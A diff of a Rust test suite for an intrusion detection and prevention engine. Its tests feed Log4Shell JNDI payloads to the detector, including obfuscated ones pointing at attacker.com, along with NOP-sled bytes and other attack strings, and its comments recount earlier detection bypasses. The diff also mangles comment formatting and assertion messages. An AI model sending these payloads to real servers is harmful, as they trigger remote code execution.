@@ -1,7 +1,6 @@
 //! Adversarial IDS / IPS engine tests.
 //!
-//! Critical properties under test:
-//! - **Binary NOP sled** must be detected by actual 0x90 bytes (not ASCII text)
+//! Critical properties under test://! - **Binary NOP sled** must be detected by actual 0x90 bytes (not ASCII text)
 //! - **EHLO** must NOT fire as a false positive
 //! - **IPS mode** must issue `Drop` verdict; IDS mode must downgrade to `Alert`
 //! - **Log4Shell** `${jndi:` pattern must be caught
@@ -37,7 +36,7 @@ fn ips_engine() -> IdsEngine {
 #[test]
 fn test_nop_sled_actual_bytes_detected() {
     let engine = ids_engine();
-    // Craft payload with real 0x90 bytes — the kind a shellcode would contain
+// Craft payload with real 0x90 bytes — the kind a shellcode would contain
     let mut payload = b"DATA\r\n".to_vec();
     payload.extend_from_slice(&[0x90u8; 16]); // 16 NOP bytes
     payload.extend_from_slice(b"\x31\xc0\x50\x68"); // dummy shellcode stub
@@ -52,7 +51,7 @@ fn test_nop_sled_actual_bytes_detected() {
 #[test]
 fn test_nop_sled_ascii_text_not_detected() {
     let engine = ids_engine();
-    // This is the TEXT string "\\x90\\x90\\x90\\x90" — NOT actual 0x90 bytes
+// This is the TEXT string "\\x90\\x90\\x90\\x90" — NOT actual 0x90 bytes
     let payload = b"DATA\r\n\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90";
 
     let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
@@ -80,7 +79,7 @@ fn test_ehlo_no_false_positive() {
 
 // ── Modern vulnerability signatures ──────────────────────────────────────────
 
-/// Log4Shell CVE-2021-44228: `${jndi:` lookup triggers remote code execution.
+/// Log4Shell CVE-2021-44228:`${jndi:` lookup triggers remote code execution.
 #[test]
 fn test_log4shell_jndi_ldap() {
     let engine = ids_engine();
@@ -92,7 +91,7 @@ fn test_log4shell_jndi_ldap() {
         "Expected SID 2000012 (Log4Shell) in alerts: {:?}",
         alerts.iter().map(|a| a.id).collect::<Vec<_>>()
     );
-    // In IDS mode verdict should be Alert (not Drop since inline=false)
+// In IDS mode verdict should be Alert (not Drop since inline=false)
     assert_eq!(verdict, IdsVerdict::Alert);
 }
 
@@ -105,7 +104,7 @@ fn test_log4shell_jndi_dns() {
     assert!(!alerts.is_empty(), "Log4Shell via DNS jndi must be detected");
 }
 
-/// Spring4Shell CVE-2022-22965: classLoader binding via HTTP parameters.
+/// Spring4Shell CVE-2022-22965:classLoader binding via HTTP parameters.
 #[test]
 fn test_spring4shell_classloader() {
     let engine = ids_engine();
@@ -137,13 +136,13 @@ fn test_smtp_vrfy_recon() {
     assert!(alerts.iter().any(|a| a.id == 2000003), "Expected SID 2000003");
 }
 
-// ── IPS mode: inline Drop vs IDS mode: Alert downgrade ───────────────────────
+// ── IPS mode:inline Drop vs IDS mode:Alert downgrade ───────────────────────
 
 /// In IPS mode (inline=true) a matching signature must yield `Drop` (not just Alert).
 #[test]
 fn test_ips_mode_yields_drop() {
     let engine = ips_engine();
-    // Payload that matches the NOP sled signature
+// Payload that matches the NOP sled signature
     let mut payload = b"DATA\r\n".to_vec();
     payload.extend_from_slice(&[0x90u8; 16]);
 
@@ -186,11 +185,9 @@ fn test_clean_smtp_no_alerts() {
 }
 
 // ── Case-sensitivity bypass regressions ──────────────────────────────────────
-//
 // Before adding `.ascii_case_insensitive(true)` to the Aho-Corasick builder,
 // ALL text patterns were case-sensitive. `${JNDI:ldap://` (uppercase) and
 // `vrfy admin` (lowercase) both bypassed detection entirely.
-//
 // These tests would have FAILED (attack allowed through) before the patch.
 
 /// Log4Shell with ALL-UPPERCASE JNDI — previously bypassed `${jndi:` pattern.
@@ -228,8 +225,8 @@ fn test_log4shell_mixedcase_jndi_blocked() {
 #[test]
 fn test_log4shell_raw_jndi_ldap_no_wrapper_detected() {
     let engine = ids_engine();
-    // Raw JNDI URL — no `${...}` prefix. SID 2000012 requires `${jndi:` so only
-    // SID 2000017 (pattern `jndi:ldap://`) fires here.
+// Raw JNDI URL — no `${...}` prefix. SID 2000012 requires `${jndi:` so only
+// SID 2000017 (pattern `jndi:ldap://`) fires here.
     let payload = b"GET /?redirect=jndi:ldap://attacker.com/exploit HTTP/1.1\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
     assert!(
@@ -238,7 +235,7 @@ fn test_log4shell_raw_jndi_ldap_no_wrapper_detected() {
     );
     assert!(
         alerts.iter().any(|a| a.id == 2000017),
-        "Expected SID 2000017 (bare jndi:ldap:// URL), got: {:?}",
+        "Expected SID 2000017 (bare jndi:ldap:// URL), got:{:?}",
         alerts.iter().map(|a| a.id).collect::<Vec<_>>()
     );
 }
@@ -246,11 +243,11 @@ fn test_log4shell_raw_jndi_ldap_no_wrapper_detected() {
 /// SID 2000090 now detects deeply nested `${j${::-n}di:ldap://...}` obfuscation.
 /// The improved regex uses `.{0,50}` wildcards between each JNDI component letter
 /// so it can cross inner `${::-X}` substitution boundaries that previously broke
-/// the `[^\}]*` character class.  This test verifies the bypass is caught.
+/// the `[^\}]*` character class. This test verifies the bypass is caught.
 #[test]
 fn test_log4shell_deeply_obfuscated_known_bypass() {
     let engine = ids_engine();
-    // `${j${::-n}di:ldap://...}` — nested substitution obfuscation
+// `${j${::-n}di:ldap://...}` — nested substitution obfuscation
     let payload = b"GET /?x=${j${::-n}di:ldap://attacker.com/x} HTTP/1.1\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
     let fired_sids: Vec<u32> = alerts.iter().map(|a| a.id).collect();
@@ -262,11 +259,11 @@ fn test_log4shell_deeply_obfuscated_known_bypass() {
     );
 }
 
-/// SID 2000017 IIOP variant: raw `jndi:iiop://` without `${...}` wrapper.
+/// SID 2000017 IIOP variant:raw `jndi:iiop://` without `${...}` wrapper.
 #[test]
 fn test_log4shell_raw_jndi_iiop_detected() {
     let engine = ids_engine();
-    // Plain JNDI IIOP URL — tests that SID 2000017 also covers non-ldap protocols.
+// Plain JNDI IIOP URL — tests that SID 2000017 also covers non-ldap protocols.
     let payload = b"X-Forwarded-For: jndi:iiop://10.0.0.1:1099/malicious-object\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 443, "https", payload);
     assert!(
@@ -275,7 +272,7 @@ fn test_log4shell_raw_jndi_iiop_detected() {
     );
     assert!(
         alerts.iter().any(|a| a.id == 2000017),
-        "Expected SID 2000017 (jndi:iiop:// URL), got: {:?}",
+        "Expected SID 2000017 (jndi:iiop:// URL), got:{:?}",
         alerts.iter().map(|a| a.id).collect::<Vec<_>>()
     );
 }
@@ -313,7 +310,7 @@ fn test_smtp_vrfy_mixedcase_detected() {
 #[test]
 fn test_smtp_auth_plain_lowercase_detected() {
     let engine = ids_engine();
-    // base64 of "user:pass" – legitimate format but lowercase command should still match
+// base64 of "user:pass" – legitimate format but lowercase command should still match
     let payload = b"auth plain dXNlcjpwYXNz\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 587, "smtp", payload);
     assert!(
@@ -351,10 +348,10 @@ fn test_php_stream_wrapper_uppercase_detected() {
     );
 }
 
-// ── False-positive guard: case-insensitive must NOT over-match ────────────────
+// ── False-positive guard:case-insensitive must NOT over-match ────────────────
 
 /// Normal SMTP EHLO must NEVER fire even with ascii_case_insensitive enabled.
-/// Regression guard: adding case-insensitivity must not create new false positives.
+/// Regression guard:adding case-insensitivity must not create new false positives.
 #[test]
 fn test_ehlo_still_no_false_positive_after_case_insensitive() {
     let engine = ids_engine();
